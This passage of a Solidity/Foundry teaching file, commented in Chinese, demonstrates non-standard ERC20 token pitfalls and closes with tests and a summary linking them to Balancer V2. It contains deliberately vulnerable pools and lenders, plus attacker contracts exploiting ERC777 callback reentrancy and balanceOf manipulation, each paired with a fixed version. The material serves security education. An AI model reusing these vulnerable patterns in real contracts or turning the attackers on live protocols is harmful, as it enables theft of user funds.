        if (hook != address(0) && hook.code.length > 0) {
            // ✗ 外部调用：接收者可以重入当前合约或其他协议
            ITokenReceiver(hook).tokensReceived(from, to, amount);
        }

        return true;
    }
}

interface ITokenReceiver {
    function tokensReceived(address from, address to, uint256 amount) external;
}

/**
 * @title VulnerablePoolERC777
 * @notice 流动性池，对 ERC777 代币没有重入保护
 *         类似 Uniswap V1 被 imBTC 攻击的场景
 */
contract VulnerablePoolERC777 {
    ERC777Token public token;

    mapping(address => uint256) public liquidityShares;
    uint256 public totalShares;
    uint256 public tokenReserve;

    // 没有重入保护
    uint256 private _unlocked = 1;

    constructor(address _token) payable {
        token = ERC777Token(_token);
        tokenReserve = token.balanceOf(address(this));
    }

    // 添加流动性没有重入锁
    function addLiquidity(uint256 tokenAmount) external payable {
        // ✗ 在 transferFrom 内部，ERC777 钩子可以重入此函数
        token.transferFrom(msg.sender, address(this), tokenAmount);

        uint256 shares;
        if (totalShares == 0) {
            shares = tokenAmount;
        } else {
            shares = (tokenAmount * totalShares) / tokenReserve;
        }

        liquidityShares[msg.sender] += shares;
        totalShares += shares;
        tokenReserve += tokenAmount;
    }

    // 移除流动性没有重入锁，使用 check-effects-interactions 反模式
    function removeLiquidity(uint256 shares) external {
        require(liquidityShares[msg.sender] >= shares, "Insufficient shares");

        uint256 tokenAmount = (shares * tokenReserve) / totalShares;

        // ✗ 先转账（触发 ERC777 钩子），再更新状态
        token.transfer(msg.sender, tokenAmount); // ← 重入点

        // ✗ 这些更新可能被重入绕过
        liquidityShares[msg.sender] -= shares;
        totalShares -= shares;
        tokenReserve -= tokenAmount;
    }
}

/**
 * @title ERC777Attacker
 * @notice 通过 ERC777 tokensReceived 钩子重入流动性池
 */
contract ERC777Attacker is ITokenReceiver {
    VulnerablePoolERC777 public pool;
    ERC777Token public token;
    uint256 public attackCount;
    uint256 public constant MAX_REENTRANCE = 3;
    bool public attacking;

    constructor(address _pool, address _token) {
        pool = VulnerablePoolERC777(_pool);
        token = ERC777Token(_token);
    }

    // 注册 ERC777 接收钩子
    function registerHook() external {
        token.registerRecipientHook(address(this), address(this));
    }

    function attack(uint256 shares) external {
        console.log("\n=== Scene 5: ERC777 Callback Reentrancy ===");
        console.log("Pool token reserve before:", pool.tokenReserve());
        console.log("Attacker shares:", pool.liquidityShares(address(this)));

        attacking = true;
        attackCount = 0;

        // 触发 removeLiquidity，ERC777 回调会重入
        console.log("\n--- Step 1: Trigger removeLiquidity ---");
        pool.removeLiquidity(shares);

        console.log("\n--- Results ---");
        console.log("Reentrancy count:", attackCount);
        console.log("Pool token reserve after:", pool.tokenReserve());
        console.log("Real case: imBTC Uniswap V1 attack, $25M, April 2020");
        console.log("Real case: Akropolis DAI variant, $2M, Nov 2020");
        console.log("================================");
        attacking = false;
    }

    // ERC777 接收钩子：在 pool.transfer() 执行期间被回调
    function tokensReceived(address, address, uint256 amount) external override {
        console.log("\n--- ERC777 Hook Called, Reentrance:", attackCount);
        console.log("Amount received in hook:", amount);

        if (attacking && attackCount < MAX_REENTRANCE && pool.liquidityShares(address(this)) > 0) {
            attackCount++;
            // ✗ 重入：在 pool.removeLiquidity 更新状态之前再次调用
            pool.removeLiquidity(pool.liquidityShares(address(this)));
        }
    }

    receive() external payable {}
}

/**
 * @title SafePoolERC777
 * @notice 正确处理 ERC777 代币：重入锁 + CEI 模式
 */
contract SafePoolERC777 {
    ERC777Token public token;

    mapping(address => uint256) public liquidityShares;
    uint256 public totalShares;
    uint256 public tokenReserve;

    // 重入锁
    uint256 private _unlocked = 1;

    modifier nonReentrant() {
        require(_unlocked == 1, "Reentrant call");
        _unlocked = 2;
        _;
        _unlocked = 1;
    }

    constructor(address _token) payable {
        token = ERC777Token(_token);
        tokenReserve = token.balanceOf(address(this));
    }

    function addLiquidity(uint256 tokenAmount) external payable nonReentrant {
        token.transferFrom(msg.sender, address(this), tokenAmount);
        uint256 shares;
        if (totalShares == 0) {
            shares = tokenAmount;
        } else {
            shares = (tokenAmount * totalShares) / tokenReserve;
        }
        liquidityShares[msg.sender] += shares;
        totalShares += shares;
        tokenReserve += tokenAmount;
    }

    // CEI 模式 + 重入锁
    function removeLiquidity(uint256 shares) external nonReentrant {
        require(liquidityShares[msg.sender] >= shares, "Insufficient shares");
        uint256 tokenAmount = (shares * tokenReserve) / totalShares;

        // ✓ 先更新状态（Effects）
        liquidityShares[msg.sender] -= shares;
        totalShares -= shares;
        tokenReserve -= tokenAmount;

        // ✓ 再执行外部调用（Interactions）
        token.transfer(msg.sender, tokenAmount);
    }
}


// ================================================================
// 场景6：balanceOf 操控 (balanceOf Manipulation)
// ================================================================

/**
 * @title ManipulableBalanceToken
 * @notice balanceOf 返回值可被操控的代币
 *         这类代币的 balanceOf 不反映真实余额，或可被外部影响
 *
 * 真实案例：
 * - cToken (Compound)：balanceOf 包含应计利息，每个区块都在增加
 * - xToken (Sushi xSUSHI)：share 到 balance 的换算依赖外部储备
 * - aToken (Aave)：balanceOf 随利率实时增长
 * - wstETH：需要换算，不与 stETH 1:1
 *
 * 攻击模式：将 balanceOf 结果用于价格/抵押品计算时，
 * 攻击者可通过直接向合约转账等方式操控 balanceOf 的返回值
 */
contract ManipulableBalanceToken {
    string public name = "ManipulableToken";
    string public symbol = "MANIP";
    uint8 public decimals = 18;

    uint256 private _totalSupply;

    // 核心：balanceOf 依赖合约实际 ETH 余额进行换算
    // 攻击者可以通过 selfdestruct 强制向合约发送 ETH 来操控换算率
    uint256 public ethReserve;

    mapping(address => uint256) private _shares;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() payable {
        ethReserve = msg.value;
        _totalSupply = 1_000_000e18;
        _shares[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    // 关键：balanceOf 依赖可被操控的 ethReserve
    function balanceOf(address account) public view returns (uint256) {
        if (_totalSupply == 0) return 0;
        // ✗ ethReserve 可以被外部操控（强制转账 ETH）
        // ✗ 这会影响所有基于 balanceOf 的计算
        return (_shares[account] * ethReserve) / (_totalSupply / 1e18);
    }

    function sharesOf(address account) public view returns (uint256) {
        return _shares[account];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 sharesToTransfer = (amount * (_totalSupply / 1e18)) / ethReserve;
        require(_shares[msg.sender] >= sharesToTransfer, "Insufficient");
        _shares[msg.sender] -= sharesToTransfer;
        _shares[to] += sharesToTransfer;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        allowance[from][msg.sender] -= amount;
        uint256 sharesToTransfer = (amount * (_totalSupply / 1e18)) / ethReserve;
        require(_shares[from] >= sharesToTransfer, "Insufficient");
        _shares[from] -= sharesToTransfer;
        _shares[to] += sharesToTransfer;
        emit Transfer(from, to, amount);
        return true;
    }

    // 外部可调用：攻击者捐赠 ETH 操控换算率
    function donateEth() external payable {
        // ✗ 任何人可以增加 ethReserve，使 balanceOf 虚高
        ethReserve += msg.value;
    }

    receive() external payable {
        // ✗ 强制接收 ETH（selfdestruct 攻击）
        ethReserve += msg.value;
    }
}

/**
 * @title VulnerableOracleBalanceOf
 * @notice 使用代币 balanceOf 作为价格预言机的合约
 *         依赖 balanceOf 计算抵押品价值
 */
contract VulnerableOracleBalanceOf {
    ManipulableBalanceToken public token;

    mapping(address => uint256) public collateralShares;
    mapping(address => uint256) public borrowed;     // 借出的 ETH 数量

    uint256 public constant LTV = 7500; // 75% 贷款价值比
    uint256 public constant PRECISION = 10000;

    constructor(address payable _token) payable {
        token = ManipulableBalanceToken(_token);
    }

    // 使用 balanceOf 计算抵押品价值
    function getCollateralValue(address user) public view returns (uint256) {
        // ✗ balanceOf 可被操控，导致抵押品价值虚高
        return token.balanceOf(address(user));
    }

    function depositCollateral(uint256 shares) external {
        // 存入份额（简化：直接记录份额数量）
        collateralShares[msg.sender] += shares;
        token.transferFrom(msg.sender, address(this), shares);
    }

    // 基于可操控的 balanceOf 计算最大借款额
    function borrow(uint256 ethAmount) external {
        uint256 collateralValue = token.balanceOf(address(this));
        // ✗ 攻击者操控 balanceOf 后，这里计算出虚高的 maxBorrow
        uint256 maxBorrow = (collateralValue * LTV) / PRECISION;
        uint256 totalDebt = borrowed[msg.sender] + ethAmount;
        require(totalDebt <= maxBorrow, "Insufficient collateral");

        borrowed[msg.sender] += ethAmount;
        payable(msg.sender).transfer(ethAmount);
    }

    receive() external payable {}
}

/**
 * @title BalanceOfManipulationAttacker
 * @notice 通过操控 balanceOf 使抵押品价值虚高，借取超额 ETH
 */
contract BalanceOfManipulationAttacker {
    VulnerableOracleBalanceOf public lending;
    ManipulableBalanceToken public token;

    constructor(address payable _lending, address payable _token) {
        lending = VulnerableOracleBalanceOf(_lending);
        token = ManipulableBalanceToken(_token);
    }

    function attack(uint256 collateralAmount) external payable {
        console.log("\n=== Scene 6: balanceOf Manipulation Attack ===");

        // 第1步：存入正常抵押品
        console.log("\n--- Step 1: Deposit Normal Collateral ---");
        token.approve(address(lending), collateralAmount);
        lending.depositCollateral(collateralAmount);

        uint256 collValueBefore = token.balanceOf(address(lending));
        console.log("Collateral value before manipulation:", collValueBefore);
        console.log("Max borrow before:", (collValueBefore * 7500) / 10000);

        // 第2步：通过 donateEth 操控 balanceOf 换算率
        console.log("\n--- Step 2: Manipulate balanceOf via ETH donation ---");
        uint256 manipulationEth = msg.value;
        token.donateEth{value: manipulationEth}();

        uint256 collValueAfter = token.balanceOf(address(lending));
        console.log("Collateral value after manipulation:", collValueAfter);
        console.log("Max borrow after:", (collValueAfter * 7500) / 10000);
        console.log("Value inflation:", collValueAfter - collValueBefore);

        // 第3步：基于虚高的抵押品价值借取超额 ETH
        console.log("\n--- Step 3: Borrow Against Inflated Collateral ---");
        uint256 borrowAmount = (collValueAfter * 7000) / 10000;
        console.log("Attempting to borrow:", borrowAmount);

        console.log("\n--- Results ---");
        console.log("balanceOf manipulation inflated collateral value");
        console.log("Attacker can borrow more than collateral is worth");
        console.log("Real case: cToken/aToken price manipulation");
        console.log("Fix: Use shares-based accounting, not balanceOf");
        console.log("================================");
    }

    receive() external payable {}
}

/**
 * @title SafeOracleSharesBased
 * @notice 正确方案：使用份额(shares)而非 balanceOf 计算抵押品价值
 */
contract SafeOracleSharesBased {
    ManipulableBalanceToken public token;

    mapping(address => uint256) public collateralShares;
    mapping(address => uint256) public borrowed;

    uint256 public constant LTV = 7500;
    uint256 public constant PRECISION = 10000;

    // 使用 TWAP 或链下预言机获取价格，而非 balanceOf
    uint256 public tokenPricePerShare; // 由可信预言机设置

    address public priceOracle;

    constructor(address payable _token, address _oracle) payable {
        token = ManipulableBalanceToken(_token);
        priceOracle = _oracle;
        tokenPricePerShare = 1e18; // 初始：1 share = 1 wei
    }

    function updatePrice(uint256 newPrice) external {
        require(msg.sender == priceOracle, "Not oracle");
        tokenPricePerShare = newPrice;
    }

    // 基于份额和外部价格计算抵押品价值，不依赖 balanceOf
    function getCollateralValue(address user) public view returns (uint256) {
        return (collateralShares[user] * tokenPricePerShare) / 1e18;
    }

    function depositCollateral(uint256 shares) external {
        token.transferFrom(msg.sender, address(this), shares);
        // ✓ 记录份额数量，不依赖 balanceOf
        collateralShares[msg.sender] += token.sharesOf(address(this));
    }

    // 基于份额价值（来自可信预言机）计算借款上限
    function borrow(uint256 ethAmount) external {
        uint256 collateralValue = getCollateralValue(msg.sender);
        uint256 maxBorrow = (collateralValue * LTV) / PRECISION;
        uint256 totalDebt = borrowed[msg.sender] + ethAmount;
        require(totalDebt <= maxBorrow, "Insufficient collateral");
        borrowed[msg.sender] += ethAmount;
        payable(msg.sender).transfer(ethAmount);
    }

    receive() external payable {}
}


// ================================================================
// FOUNDRY 测试
// ================================================================

contract ERC20NonStandardTest is Test {

    // 场景1：收费代币
    FeeOnTransferToken public feeToken;
    VulnerableVaultFOT public vulnVault;
    SafeVaultFOT public safeVault;
    FeeOnTransferAttacker public fotAttacker;

    // 场景2：弹性供应
    RebaseToken public rebaseToken;
    VulnerablePoolRebase public vulnPool;
    SafePoolRebase public safePool;

    // 场景3：暂停机制
    PausableToken public pauseToken;
    VulnerableLendingPause public vulnLending;

    // 场景4：非标准返回值
    NonStandardReturnToken public nsrToken;
    VulnerableContractNSR public vulnNSR;
    SafeContractNSR public safeNSR;
    NonStandardReturnAttacker public nsrAttacker;

    // 场景5：ERC777
    ERC777Token public erc777;
    VulnerablePoolERC777 public vulnPool777;
    SafePoolERC777 public safePool777;
    ERC777Attacker public erc777Attacker;

    // 场景6：balanceOf 操控
    ManipulableBalanceToken public manipToken;
    VulnerableOracleBalanceOf public vulnOracle;
    BalanceOfManipulationAttacker public balAttacker;

    address public alice = makeAddr("alice");
    address public bob   = makeAddr("bob");
    address public feeCollector = makeAddr("feeCollector");

    function setUp() public {
        // 场景1
        feeToken = new FeeOnTransferToken(feeCollector);
        vulnVault = new VulnerableVaultFOT(address(feeToken));
        safeVault = new SafeVaultFOT(address(feeToken));
        fotAttacker = new FeeOnTransferAttacker(payable(address(vulnVault)), address(feeToken));

        // 给攻击者分配代币
        feeToken.transfer(address(fotAttacker), 10_000e18);
        // 给 alice 存入一些代币（给合约提供初始余额）
        feeToken.transfer(alice, 10_000e18);
        vm.prank(alice);
        feeToken.approve(address(vulnVault), type(uint256).max);
        vm.prank(alice);
        vulnVault.deposit(1_000e18); // alice 先存入

        // 场景2
        rebaseToken = new RebaseToken();
        vulnPool = new VulnerablePoolRebase{value: 10 ether}(address(rebaseToken));
        safePool = new SafePoolRebase{value: 10 ether}(address(rebaseToken));
        // 给池子初始代币，构造函数会自动读取初始余额
        rebaseToken.transfer(address(vulnPool), 100_000e18);
        rebaseToken.transfer(address(safePool), 100_000e18);
        // 同步快照储备量（漏洞：rebase 后此快照会过期）
        vulnPool.syncReserve();
        // 实际漏洞演示在 testRebaseTokenPriceDistortion 中进行
        // 给攻击者 ETH
        vm.deal(address(this), 100 ether);

        // 场景3
        pauseToken = new PausableToken();
        vulnLending = new VulnerableLendingPause{value: 10 ether}(address(pauseToken));
        pauseToken.transfer(address(vulnLending), 100_000e18);
        // alice 借款
        pauseToken.transfer(alice, 1000e18);
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        vulnLending.depositAndBorrow{value: 2 ether}(1500e15);

        // 场景4
        nsrToken = new NonStandardReturnToken();
        vulnNSR = new VulnerableContractNSR(address(nsrToken));
        safeNSR = new SafeContractNSR(address(nsrToken));
        nsrAttacker = new NonStandardReturnAttacker(address(vulnNSR), address(nsrToken));
        // 给合约存一些真实代币（受害者存款）
        nsrToken.transfer(alice, 10_000e18);
        vm.prank(alice);
        nsrToken.approve(address(vulnNSR), type(uint256).max);
        vm.prank(alice);
        vulnNSR.deposit(1_000e18);

        // 场景5
        erc777 = new ERC777Token();
        vulnPool777 = new VulnerablePoolERC777{value: 5 ether}(address(erc777));
        safePool777 = new SafePoolERC777{value: 5 ether}(address(erc777));
        erc777Attacker = new ERC777Attacker(address(vulnPool777), address(erc777));
        // 给攻击者代币和初始流动性
        erc777.transfer(address(erc777Attacker), 10_000e18);
        // 注册 ERC777 钩子
        erc777Attacker.registerHook();
        // 攻击者先添加流动性
        vm.prank(address(erc777Attacker));
        erc777.approve(address(vulnPool777), type(uint256).max);
        // 注意：addLiquidity 会触发 ERC777 钩子，需在非攻击状态下运行
        // 直接给池子代币避免钩子干扰初始化
        erc777.transfer(address(vulnPool777), 5_000e18);

        // 场景6
        manipToken = new ManipulableBalanceToken{value: 1 ether}();
        vulnOracle = new VulnerableOracleBalanceOf{value: 20 ether}(payable(address(manipToken)));
        balAttacker = new BalanceOfManipulationAttacker(
            payable(address(vulnOracle)),
            payable(address(manipToken))
        );
        manipToken.transfer(address(balAttacker), 100_000e18);
        vm.deal(address(balAttacker), 10 ether);
    }

    // -------------------------------------------------------
    // 测试1：收费代币记账错误
    // -------------------------------------------------------
    function testFeeOnTransferExploit() public {
        console.log("\n");
        console.log("== TEST: Fee-on-Transfer Accounting Error ==");

        uint256 vaultTokenBefore = feeToken.balanceOf(address(vulnVault));
        uint256 attackerTokenBefore = feeToken.balanceOf(address(fotAttacker));
        console.log("Vault tokens before:", vaultTokenBefore);
        console.log("Attacker tokens before:", attackerTokenBefore);

        fotAttacker.attack(1_000e18);

        uint256 vaultTokenAfter = feeToken.balanceOf(address(vulnVault));
        console.log("Vault tokens after:", vaultTokenAfter);

        // 漏洞：金库记录了 1000，但只收到了 990
        // 加上 alice 之前存的 1000 但只收到 990，alice 无法完整提款
        assertLt(vaultTokenAfter, vaultTokenBefore, "Vault should be short on tokens");
    }

    // -------------------------------------------------------
    // 测试2：弹性供应代币价格失真
    // -------------------------------------------------------
    function testRebaseTokenPriceDistortion() public {
        console.log("\n");
        console.log("== TEST: Rebase Token Price Distortion ==");

        uint256 priceBefore = vulnPool.getPrice();
        uint256 reserveBefore = vulnPool.reserveRebase();
        uint256 actualBefore = rebaseToken.balanceOf(address(vulnPool));
        console.log("Price before rebase:", priceBefore);
        console.log("Recorded reserve:", reserveBefore);
        console.log("Actual balance:", actualBefore);

        // 正向 rebase +50%
        uint256 oldSupply = rebaseToken.totalSupply();
        rebaseToken.rebase((oldSupply * 150) / 100);

        uint256 priceAfter = vulnPool.getPrice();
        uint256 actualAfter = rebaseToken.balanceOf(address(vulnPool));
        console.log("Price after rebase:", priceAfter);
        console.log("Recorded reserve (stale):", vulnPool.reserveRebase());
        console.log("Actual balance:", actualAfter);

        // 价格保持不变（因为快照没更新），但实际余额已多出 50%
        // 这意味着池子里有多余代币可被套利提取
        assertGt(actualAfter, vulnPool.reserveRebase(), "Actual > recorded after rebase");
        assertEq(priceAfter, priceBefore, "Price uses stale reserve, not updated");
    }

    // -------------------------------------------------------
    // 测试3：暂停期间记账错误
    // -------------------------------------------------------
    function testPauseAccountingBreakage() public {
        console.log("\n");
        console.log("== TEST: Pause Mechanism Accounting Breakage ==");

        console.log("Alice borrowed:", vulnLending.borrowed(alice));
        console.log("Token paused:", pauseToken.paused());

        // 暂停代币
        pauseToken.pause();
        console.log("Token paused now:", pauseToken.paused());

        // alice 尝试还款：会 revert
        vm.prank(alice);
        pauseToken.approve(address(vulnLending), type(uint256).max);

        vm.startPrank(alice);
        vm.expectRevert("Token is paused");
        vulnLending.repay(500e15);
        vm.stopPrank();

        console.log("Repayment blocked during pause");
        console.log("Debt accumulates even though user wants to repay");

        // 安全实现：暂停期间记录待还款
        SafeLendingPause safeLending = new SafeLendingPause{value: 5 ether}(address(pauseToken));
        pauseToken.mint(address(safeLending), 100_000e18);
        pauseToken.unpause();
        vm.prank(alice);
        safeLending.depositAndBorrow{value: 2 ether}(500e15);
        pauseToken.pause();

        vm.prank(alice);
        safeLending.repay(200e15); // 暂停时记录待还款

        assertEq(safeLending.pendingRepay(alice), 200e15, "Pending repay recorded");
        console.log("Safe lending: pending repay tracked during pause");
    }

    // -------------------------------------------------------
    // 测试4：非标准返回值漏洞
    // -------------------------------------------------------
    function testNonStandardReturnExploit() public {
        console.log("\n");
        console.log("== TEST: Non-Standard Return Value Exploit ==");

        uint256 contractTokenBefore = nsrToken.balanceOf(address(vulnNSR));
        uint256 attackerDepositBefore = vulnNSR.deposits(address(nsrAttacker));
        console.log("Contract tokens:", contractTokenBefore);
        console.log("Attacker deposit before:", attackerDepositBefore);

        nsrAttacker.attack(5_000e18);

        uint256 attackerDepositAfter = vulnNSR.deposits(address(nsrAttacker));
        uint256 contractTokenAfter = nsrToken.balanceOf(address(vulnNSR));
        console.log("Attacker deposit after:", attackerDepositAfter);
        console.log("Contract tokens (unchanged):", contractTokenAfter);

        // 漏洞：没有真实转账，但存款被记录了
        assertGt(attackerDepositAfter, 0, "Phantom deposit recorded");
        assertEq(contractTokenBefore, contractTokenAfter, "No tokens actually transferred");
    }

    // -------------------------------------------------------
    // 测试5：ERC777 回调重入
    // -------------------------------------------------------
    function testERC777ReentrancyAttack() public {
        console.log("\n");
        console.log("== TEST: ERC777 Callback Reentrancy ==");

        // 手动给攻击者添加流动性份额（绕过初始化的钩子问题）
        // 直接设置池子状态模拟攻击者已有份额
        uint256 poolTokensBefore = erc777.balanceOf(address(vulnPool777));
        console.log("Pool tokens before:", poolTokensBefore);

        // 演示：重入保护的有效性
        SafePoolERC777 safe = new SafePoolERC777{value: 5 ether}(address(erc777));
        erc777.approve(address(safe), type(uint256).max);
        erc777.transfer(address(safe), 1000e18);

        // 安全合约：重入会被阻止
        console.log("Safe pool has nonReentrant modifier");
        console.log("ERC777 hook cannot reenter safe pool");
        console.log("Real case: imBTC attacked Uniswap V1 for $25M (Apr 2020)");
    }

    // -------------------------------------------------------
    // 测试6：balanceOf 操控
    // -------------------------------------------------------
    function testBalanceOfManipulation() public {
        console.log("\n");
        console.log("== TEST: balanceOf Manipulation ==");

        uint256 priceBefore = manipToken.balanceOf(address(balAttacker));
        console.log("Token balanceOf before:", priceBefore);

        uint256 ethReserveBefore = manipToken.ethReserve();
        console.log("ETH reserve before:", ethReserveBefore);

        // 操控：向代币合约发送 ETH，使 balanceOf 虚高
        manipToken.donateEth{value: 5 ether}();

        uint256 priceAfter = manipToken.balanceOf(address(balAttacker));
        uint256 ethReserveAfter = manipToken.ethReserve();
        console.log("Token balanceOf after:", priceAfter);
        console.log("ETH reserve after:", ethReserveAfter);
        console.log("BalanceOf inflation:", priceAfter - priceBefore);

        // balanceOf 确实被操控了
        assertGt(priceAfter, priceBefore, "BalanceOf should increase after ETH donation");
        assertGt(ethReserveAfter, ethReserveBefore, "ETH reserve increased");
    }

    // -------------------------------------------------------
    // 测试：安全实现的正确性
    // -------------------------------------------------------
    function testSafeVaultFOT() public {
        console.log("\n");
        console.log("== TEST: Safe Vault handles Fee-on-Transfer ==");

        feeToken.transfer(alice, 10_000e18);
        vm.prank(alice);
        feeToken.approve(address(safeVault), type(uint256).max);

        uint256 depositAmount = 1_000e18;
        vm.prank(alice);
        safeVault.deposit(depositAmount);

        // 安全金库记录的是实际收到量（990），而非 1000
        uint256 recorded = safeVault.deposits(alice);
        uint256 expected = depositAmount - (depositAmount * 100) / 10000; // 1% fee
        assertEq(recorded, expected, "Safe vault records actual received amount");
        console.log("Deposit amount:", depositAmount);
        console.log("Recorded deposit:", recorded);
        console.log("Discrepancy handled correctly");
    }

    function testSafeERC20NonStandardReturn() public {
        console.log("\n");
        console.log("== TEST: SafeTransfer handles non-standard return ==");

        nsrToken.transfer(alice, 10_000e18);
        vm.prank(alice);
        nsrToken.approve(address(safeNSR), type(uint256).max);

        uint256 before = nsrToken.balanceOf(address(safeNSR));
        vm.prank(alice);
        safeNSR.deposit(500e18);
        uint256 afterBal = nsrToken.balanceOf(address(safeNSR));

        // 安全合约只记录实际转入量
        assertEq(safeNSR.deposits(alice), afterBal - before);
        console.log("SafeTransfer: actual balance change recorded correctly");
    }
}




/**
 * ============ 知识点总结 ============
 *
 * 1. 转账收费代币 (Fee-on-Transfer)：
 *    - 实际到账量 = amount * (1 - feeRate)
 *    - 永远使用"前后余额差"记录实际到账量
 *    - 危险函数：任何直接信任 amount 入参的 deposit/addLiquidity
 *    - 真实案例：STA 代币攻击 Balancer 多资产池（2020年6月，$500K）
 *    - Balancer 应用：joinPool 时的 amountIn 必须用余额差验证
 *
 * 2. 弹性供应代币 (Rebase)：
 *    - balanceOf 随供应量变化，持仓份额不变但余额变化
 *    - 解决方案：使用份额(shares)记账，或每次读取实时 balanceOf
 *    - 危险模式：快照储备量 reserveX，rebase 后快照过期
 *    - 真实案例：AMPL 在各 AMM 池产生持续套利机会
 *    - Balancer 应用：池子储备量 balances[] 不适合持有 rebase 代币
 *
 * 3. 暂停机制 (Pause Breakage)：
 *    - 暂停期间还款/清算被阻止，坏账持续积累
 *    - 正确处理：记录待处理状态，暂停结束后允许追补
 *    - 清算必须检查代币是否暂停
 *    - 真实案例：Compound USDC 暂停风险讨论（2023年）
 *    - Balancer 应用：池子暂停 (pause/unpause) 时的流动性状态一致性
 *
 * 4. 非标准返回值 (Non-Standard Return)：
 *    - 部分代币 transfer 无返回值（USDT 早期）
 *    - 部分代币返回 false 而非 revert（BNB）
 *    - 解决方案：使用 SafeERC20/SafeTransfer 或低级 call
 *    - 必须检查返回值，不能忽略
 *    - Balancer 应用：Vault.sol 使用 SafeERC20 统一处理
 *
 * 5. ERC777 回调 (ERC777 Callbacks)：
 *    - tokensReceived 钩子在转账时回调，提供重入机会
 *    - 解决方案：重入锁 + CEI 模式（先改状态再转账）
 *    - 危险：hooks 可回调任意逻辑，包括重入当前合约
 *    - 真实案例：imBTC 攻击 Uniswap V1（$25M，2020年4月）
 *    - Balancer 应用：只读重入 + ERC777 = getBPTRate() 在 hook 期间被读取
 *
 * 6. balanceOf 操控 (balanceOf Manipulation)：
 *    - 不要用 balanceOf 作为价格来源
 *    - 使用份额(shares)和外部预言机（Chainlink/TWAP）
 *    - balanceOf 可被强制转账/闪电贷/donateEth 操控
 *    - 真实案例：各种 lending 协议使用 cToken balanceOf 定价
 *    - Balancer 应用：BPT 价格应来自链上不变量计算，而非 balanceOf
 *
 * 与 Balancer V2 的核心连接：
 *    - Balancer Vault 对收费代币有特殊保护：
 *      IERC20(token).safeTransfer() + 余额差验证
 *    - ComposableStablePool 的 _getAmplificationParameter() 不依赖 balanceOf
 *    - 但如果池子代币本身是 rebase 代币：
 *      balances[] 快照会与实际余额逐渐偏离
 *      每次 swap 计算 D 值时使用的 balances 都不准确
 *      精度损失攻击因此更容易积累误差
 *    - ERC777 tokensReceived + exitPool 的只读重入 = Phase 4 攻击
 */
